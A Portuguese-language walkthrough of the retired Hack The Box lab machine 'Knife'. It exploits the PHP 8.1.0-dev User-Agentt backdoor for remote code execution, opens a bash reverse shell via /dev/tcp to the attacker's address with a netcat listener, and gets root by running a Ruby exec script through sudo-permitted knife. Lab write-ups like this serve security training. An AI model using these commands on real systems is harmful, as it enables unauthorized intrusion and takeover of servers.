---
title: HTB Knife Writeup
author: Hastur
date: 2021-09-03 21:00:00 -0300
categories: [Writeups, Hack The Box]
tags: [HTB, Retired, Linux, Easy, Web]
image: "/img/htb/htb-knife-logo.png"
alt: "HTB Knife Writeup"
---

<img src="/img/htb/htb-knife-logo.png">

<br>


| Nome | Knife       |
|------|-------------|
|IP    | 10.10.10.242|
|Pontos| 20          |
|OS    | Linux       |
|Nível | Easy        |

<br>

## RECON

### Nmap
```bash
┌──(hastur㉿hastur)-[~]
└─$ sudo nmap -v -sCV -p- -Pn -O 10.10.10.242 --min-rate=512 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea

```
Encontramos somente as portas 22 e 80 abertas. Vamos começar pela porta 80.

### Porta 80

<img src="/img/htb/htb-knife-1.png">

Apenas uma página simples sem links para seguir.

A varredura com gobuster também não trouxe nada relevante.

Vamos tentar o whatweb para obter mais informações.

```bash
┌──(hastur㉿hastur)-[~]
└─$ whatweb http://10.10.10.242/
http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Conseguimos identificar que o server roda em PHP na versão "PHP/8.1.0-dev", vamos procurar algum exploit.

```bash
┌──(hastur㉿hastur)-[~]
└─$ searchsploit "PHP 8.1.0-dev" 
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                       | php/webapps/49933.py
```
Esta versão do PHP possui uma vulnerabilidade que permite execução de código remoto via manipulação do user-agent.

Vamos copiar o exploit para nosso diretório e nomeá-lo como "exploit.py" para testá-lo.

```bash
┌──(hastur㉿hastur)-[~/knife]
└─$ python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ ls -la
total 84
drwxr-xr-x  20 root root  4096 May 18 13:25 .
drwxr-xr-x  20 root root  4096 May 18 13:25 ..
lrwxrwxrwx   1 root root     7 Feb  1  2021 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Jul 23 13:37 boot
drwxr-xr-x   2 root root  4096 May  6 14:10 cdrom
drwxr-xr-x  19 root root  4020 Sep  3 04:33 dev
drwxr-xr-x  99 root root  4096 May 18 13:25 etc
drwxr-xr-x   3 root root  4096 May  6 14:44 home
lrwxrwxrwx   1 root root     7 Feb  1  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb  1  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb  1  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 May  6 14:08 lost+found
drwxr-xr-x   2 root root  4096 May 18 13:20 media
drwxr-xr-x   2 root root  4096 May 18 13:20 mnt
drwxr-xr-x   5 root root  4096 May 18 13:20 opt
dr-xr-xr-x 358 root root     0 Sep  3 04:32 proc
drwx------   7 root root  4096 May 18 13:26 root
drwxr-xr-x  27 root root   820 Sep  3 16:47 run
lrwxrwxrwx   1 root root     8 Feb  1  2021 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 May 18 13:20 snap
drwxr-xr-x   2 root root  4096 Feb  1  2021 srv
dr-xr-xr-x  13 root root     0 Sep  3 04:32 sys
drwxrwxrwt  16 root root 12288 Sep  4 00:00 tmp
drwxr-xr-x  15 root root  4096 May 18 13:20 usr
drwxr-xr-x  14 root root  4096 May  9 04:22 var


```

Ao executarmos o exploit, temos uma versão bem resumida de RCE em forma de bash.

Para podermos explorar de forma efetiva, precisamos de um tty shell, vamos iniciar um netcat ouvindo a conexão reversa.

```bash
┌──(hastur㉿hastur)-[~/knife]
└─$ nc -vlnp 8443
listening on [any] 8443 ...
```

Agora vamos enviar um payload no terminal do RCE.

```bash
┌──(hastur㉿hastur)-[~/knife]
└─$ python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.130/8443 0>&1"
```

Checando no netcat, conseguimos um shell.

<img src="/img/htb/htb-knife-2.png">

E dentro do diretório do usuário "james", conseguimos flag do usuário.

<img src="/img/htb/htb-knife-3.png">
<br>
## ESCALAÇÃO DE PRIVILÉGIOS

Já dentro do server, vamos fazer a enumeração local, com o comando `sudo -l`, encontramos algo interessante:

<img src="/img/htb/htb-knife-4.png">

O usuário tem permissão de executar `/usr/bin/knife` com privilégios de administrador sem uso de senha, vamos enumerar este binário.

<img src="/img/htb/htb-knife-5.png">

Quando enumeramos o diretório real do binário, podemos ver que se trata de um diretório de instalação do ruby.

<img src="/img/htb/htb-knife-6.png">

Ao tentar executar o programa, ele nos retora uma grande lista de opções de argumento, entre elas uma bem interessante:

<img src="/img/htb/htb-knife-7.png">

Isso significa que podemos executar scripts em ruby, vamos voltar para o diretorio do usuário james e criar um script.

```bash
james@knife:~$ pwd                                   
pwd
/home/james
james@knife:~$ echo 'exec "/bin/bash -i"' > hastur.rb
```
Ao executar `sudo /usr/bub/knife exec hastur.rb` temos nosso shell com root e podemos enumerar a flag.

<img src="/img/htb/htb-knife-8.png">

E comprometemos o server!!
<br>

<img src="/img/htb/hackerman.gif">
<br>
### Referências

| Vulnerabilidade                           | Url                                                                                                             |
|-------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| PHP 8.1.0-dev development version backdoor| [https://github.com/flast101/php-8.1.0-dev-backdoor-rce](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)|

